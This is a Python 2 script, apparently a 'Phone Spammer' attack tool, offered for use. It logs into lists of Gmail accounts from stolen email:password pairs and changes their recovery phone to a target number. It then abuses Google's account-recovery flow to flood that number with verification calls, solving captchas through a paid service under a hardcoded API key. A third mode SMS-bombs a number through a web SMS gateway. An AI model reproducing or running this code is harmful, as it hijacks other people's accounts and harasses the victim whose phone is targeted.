import mechanize, BeautifulSoup, threading, os, commands,re, time, platform
n=0
def timing(n,size):
    time = int(float(n)/size*100)
    return "["+bcolors.HEADER+str(time)+bcolors.ENDC+"%]"

capapi= '689a8ba9bc82635447955348dbc20b25'

operatingSystem=platform.system()
class bcolors:
    if operatingSystem=='Linux':
        HEADER = '\033[95m'
        OKBLUE = '\033[94m'
        OKGREEN = '\033[92m'
        WARNING = '\033[93m'
        FAIL = '\033[91m'
        ENDC = '\033[0m'

    else:
        HEADER = ''
        OKBLUE = ''
        OKGREEN = ''
        WARNING = ''
        FAIL = ''
        ENDC = ''

def MENU():
    print bcolors.OKGREEN +"                                                                 _     \n _____ _          _____                      _____              | |    \n|_   _| |_ ___   |  |  |___ ___ ___ _____   |_   _|___ ___ _____|_|___ \n  | | |   | -_|  |  |  | -_|   | .'|     |    | | | -_| .'|     | |_ -|\n  |_| |_|_|___|   \___/|___|_|_|__,|_|_|_|    |_| |___|__,|_|_|_| |___|"
    print"   _   _   _   _   _     _   _   _   _   _   _   _  \n  / \ / \ / \ / \ / \   / \ / \ / \ / \ / \ / \ / \ \n ( "+bcolors.FAIL+"P"+bcolors.OKGREEN+" ) "+bcolors.FAIL+"h"+bcolors.OKGREEN+" ) "+bcolors.FAIL+"o"+bcolors.OKGREEN+" ) "+bcolors.FAIL+"n"+bcolors.OKGREEN+" ) "+bcolors.FAIL+"e"+bcolors.OKGREEN+" ) ( "+bcolors.FAIL+"S"+bcolors.OKGREEN+" ) "+bcolors.FAIL+"p"+bcolors.OKGREEN+" ) "+bcolors.FAIL+"a"+bcolors.OKGREEN+" ) "+bcolors.FAIL+"m"+bcolors.OKGREEN+" ) "+bcolors.FAIL+"m"+bcolors.OKGREEN+" ) "+bcolors.FAIL+"e"+bcolors.OKGREEN+" ) "+bcolors.FAIL+"r"+bcolors.OKGREEN+" )\n  \_/ \_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/ \_/ \_/ \_/ \n\n"+ bcolors.ENDC

    answer=input("["+bcolors.OKBLUE + "*" + bcolors.ENDC +"]What do You want to Do?\n[1]/Change the phone in some Gmails\n[2]/Spam a phone with Gmail  attacks\n[3]/SMS Bomber a Phone\n=> ")

    if answer==1:
        listofemail=open(raw_input("["+bcolors.OKBLUE + "*" + bcolors.ENDC +"]Location of the Gmails \n=> ")).readlines()
        number=raw_input("["+bcolors.OKBLUE + "*" + bcolors.ENDC +"]Number You Want to SPAM \n=> ")
        nbthreads=input("["+bcolors.OKBLUE + "*" + bcolors.ENDC +"]How many threads will work at the same time (Max 7)\n=> ")
        len_acs=len(listofemail)
        if len(listofemail) >= nbthreads:
            z = chunkIt(listofemail, nbthreads)
            for passz in z:
                threading.Thread(target=gmailchange, args=(passz,number,len_acs)).start()
        else:
                z = chunkIt(listofemail, len(listofemail))
                for passz in z:
                        threading.Thread(target=gmailchange, args=(passz,number,len_acs)).start()

    if answer==2:
        number = raw_input("["+bcolors.OKBLUE + "*" + bcolors.ENDC +"]Number You want to Spam ("+bcolors.WARNING+"*need to replace in Gmail first"+bcolors.ENDC+") \n=> ")
        listofemail = open(raw_input("["+bcolors.OKBLUE + "*" + bcolors.ENDC +"]Location of the Gmails \n=> ")).readlines()
        answer3=input("["+bcolors.OKBLUE + "*" + bcolors.ENDC +"]Was this a list with passwords/[1] or without passwords/[2] \n=> ")
        captchatrader = raw_input("["+bcolors.OKBLUE + "*" + bcolors.ENDC +"]Do you want to use captcha trader? [y/n] \n=> ")[0]
        if captchatrader == 'y':
            capuser=raw_input("["+bcolors.OKBLUE + "*" + bcolors.ENDC +"]What is the Username you want to use?\n=> ")
            capwd=raw_input("["+bcolors.OKBLUE + "*" + bcolors.ENDC +"]What is the Password for this Usename?\n=> ")
        if captchatrader == 'y':
            trader=True
        else:
            trader=False
        len_acs=len(listofemail)
        spammingG(listofemail,number,trader,answer3,len_acs)
    if answer==3:
        num = raw_input("["+bcolors.OKBLUE + "*" + bcolors.ENDC +"]Enter the Number You Want to SPAM :\n=> ")
        msg = raw_input("["+bcolors.OKBLUE + "*" + bcolors.ENDC +"]Enter the Message You Want to SPAM :\n=> ")
        nbtime = input ("["+bcolors.OKBLUE + "*" + bcolors.ENDC +"]Enter the Number Of Time to Send the Message :\n=> ")
        sptime = input ("["+bcolors.OKBLUE + "*" + bcolors.ENDC +"]Enter the Time between Each Message (in s) :\n=> ")
        len_acs=nbtime
        sms(msg,num,nbtime,sptime,len_acs)

def chunkIt(seq, num):
    avg = len(seq) / float(num)
    out = []
    last = 0.0
    while last < len(seq):
        out.append(seq[int(last):int(last + avg)])
        last += avg
    return out

def gmailchange(listofemail,number,len_acs):
    global n
    for a in listofemail:
        n+=1
        try:
            a = a.rsplit()[0]
            a = a.split(':')
            email = a[0]
            password = a[1]
            br = mechanize.Browser()
            br.set_handle_redirect(True)
            br.set_handle_robots(False)
            br.addheaders = [('User-agent','Mozilla/5.0 (Windows; Windows NT 6.0; rv:11.0) Gecko/20100101 Firefox/11.0')]
            br.open('http://www.gmail.com')
            br.select_form(nr=0)
            br.form['Email']=email
            br.form['Passwd']=password
            br.submit()
            br.select_form(nr=0)
            for xc in br.form.controls:
                if  xc.name == 'Passwd':
                    br.form['Email']=email
                    br.form['Passwd']=password
                    br.submit()
                    break
            br.open('https://accounts.google.com/b/0/UpdateAccountRecoveryOptions?service=oz')
            br.select_form(nr=0)
            for xc in br.form.controls:
                if  xc.name == 'Passwd':
                    br.form['Email']=email
                    br.form['Passwd']=password
                    br.submit()
                    break
            br.select_form(nr=0)
            br.form['mobileCountry']=['LB']
            br.form['mobileNumber']= number
            br.submit(name='save', label='Save')
            printed= "["+bcolors.OKGREEN + "+" + bcolors.ENDC +"] Changed the number in {"+ email+"} to => "+number
            print printed +" "*(80-len(printed)) + timing(n,len_acs)
            br.close()
        except:
            printed= "["+bcolors.FAIL + "-" + bcolors.ENDC +"] Error with => {"+email+"}"
            print printed +" "*(80-len(printed)) + timing(n,len_acs)



def spammingG(listofemail,number,trader,answer3,len_acs):
    global n
    for a in listofemail:
        n+=1
        try:
            if answer3==1:
                a = a.rsplit()[0]
                a = a.split(':')
                email = a[0]
            else:
                email=a
            last3digit=str(number[-3:])
            br = mechanize.Browser()
            br.set_handle_redirect(True)
            br.set_handle_robots(False)
            br.addheaders = [('User-agent','Mozilla/5.0 (Windows; Windows NT 6.0; rv:11.0) Gecko/20100101 Firefox/11.0')]
            br.open('http://www.google.com/accounts/recovery/?hl=en')
            br.select_form(nr=0)
            br.form['preoption'] = ['1']
            br.form['Email'] = email
            br.submit()
            while br.geturl()== 'https://www.google.com/accounts/recovery/verifyuser':
                soup = BeautifulSoup.BeautifulSoup(br.response().get_data())
                img = soup.find('img', alt="Captcha image")
                image_response = br.open_novisit('http://www.google.com'+img['src'])
                image = image_response.read()
                open('captcha.jpeg', 'wb').write(image)
                br.select_form(nr=0)

                if not trader:
                    threading.Thread(target=commands.getoutput, args=('eog "' + os.getcwd() + '"' + '/captcha.jpeg',)).start()
                    captcha = raw_input("["+bcolors.OKBLUE + "*" + bcolors.ENDC +"]Please enter the captcha \n=> ")
                    output = [i for i in os.popen('ps -ef |grep %s' % 'eog') if not 'grep' in i]
                    processID = [i.split()[1] for i in output]
                    for a in processID:
                        os.kill(int(a), 9)
                else:
                    br3 = mechanize.Browser()
                    br3.open('http://www.captchatrader.com/documentation/manual_submit/file')
                    br3.select_form(nr=1)
                    br3.form['username'] = capuser
                    br3.form['password'] = cappwd
                    br3.form['api_key'] = capapi
                    picturew = os.getcwd() + '/captcha.jpeg'
                    br3.form.add_file(open(picturew), 'text/plain', picturew, name='value')
                    br3.submit()
                    captcha = re.findall(re.compile('"(.*)"'), br3.response().read())[0]
                    print captcha
                br.form['captchaanswerresponse'] = captcha
                br.submit()
            br.select_form(nr=0)
            cond1=True
            for xc in br.form.controls:
                if  xc.name == 'phonemethod9;*****'+last3digit:
                    br.form['phonemethod9;*****'+last3digit] = ['7']
                    cond1= True
                    break
                elif xc.name=='phonemethod2;****'+last3digit:
                    br.form['phonemethod2;****'+last3digit] = ['7']
                    cond1= True
                    break
                elif xc.name=='phonemethod2;*****'+last3digit:
                    br.form['phonemethod2;*****'+last3digit] = ['7']
                    cond1= True
                    break
                elif xc.name=='phonemethod9;****'+last3digit:
                    br.form['phonemethod9;****'+last3digit] = ['7']
                    cond1= True
                    break
                else:
                    cond1 = False
            if cond1:
                br.submit()
                printed= "["+bcolors.OKBLUE + "*" + bcolors.ENDC +"]New Call Sent"
                print printed +" "*(80-len(printed)) + timing(n,len_acs)
                __import__("time").sleep(60)
            else:
                printed= "["+bcolors.WARNING+"~"+bcolors.ENDC+"] The Phone was not Added to This account {"+email+"} or not writen right or already sent 5 calls"
                print printed +" "*(80-len(printed)) + timing(n,len_acs)
            if cond1:
                yz=0
                while yz<4:
                    br.open('http://www.google.com/accounts/recovery/recoveryoptions')
                    br.select_form(nr=0)
                    cond1=True
                    for xc in br.form.controls:

                        if  xc.name == 'phonemethod9;*****'+last3digit:
                            br.form['phonemethod9;*****'+last3digit] = ['7']
                            cond1= True
                            break
                        elif xc.name=='phonemethod2;****'+last3digit:
                            br.form['phonemethod2;****'+last3digit] = ['7']
                            cond1= True
                            break
                        elif xc.name=='phonemethod2;*****'+last3digit:
                            br.form['phonemethod2;*****'+last3digit] = ['7']
                            cond1= True
                            break
                        elif xc.name=='phonemethod9;****'+last3digit:
                            br.form['phonemethod9;****'+last3digit] = ['7']
                            cond1= True
                            break
                        else:
                            cond1 = False
                    if cond1:
                        br.submit()
                        printed= "["+bcolors.OKBLUE + "*" + bcolors.ENDC +"]New Call Sent"
                        print printed +" "*(80-len(printed)) + timing(n,len_acs)
                    else:
                        printed= "["+bcolors.WARNING+"~"+bcolors.ENDC+"] The Phone was not Added to This account {"+email+"} or not writen right or already sent 5 calls"
                        print printed +" "*(80-len(printed)) + timing(n,len_acs)
                        break
                    yz+=1
                n=n+1
                __import__("time").sleep(60)
        except:
            printed= "["+bcolors.FAIL + "-" + bcolors.ENDC +"] Error with => {"+email+"}"
            print printed +" "*(80-len(printed)) + timing(n,len_acs)
    os.system('cowsay "All Done !!!"')
    print "\n"
    MENU()

def sms( msg, num, nbtime, sptime, len_acs):
    global n
    for a in xrange (nbtime):
        n+=1
        cond1= False
        while not cond1:
            try:
                    br = mechanize.Browser()
                    br = mechanize.Browser()
                    br.set_handle_robots(False)
                    br.set_handle_redirect(True)
                    br.open('http://www.slidesms.com/indexbeta.php')
                    br.select_form(nr=0)
                    form1 = re.findall(re.compile('<td style="padding-left:5px; padding-top:8px;"><input name="(.*)" id='), br.response().read())[0]
                    br.form['country'] = ['Lebanon']
                    br.form[form1] = '00961'+num
                    br.form['mymessage'] = msg
                    br.submit()
                    printed= "["+bcolors.OKGREEN + "+" + bcolors.ENDC +"]A New Message was Sent !"
                    print printed +" "*(80-len(printed)) + timing(n,len_acs)
                    time.sleep(sptime)
                    cond1 = True
            except:
                printed= "["+bcolors.FAIL + "-" + bcolors.ENDC + "]Error"
                print printed +" "*(80-len(printed)) + timing(n,len_acs)
    MENU()


MENU()





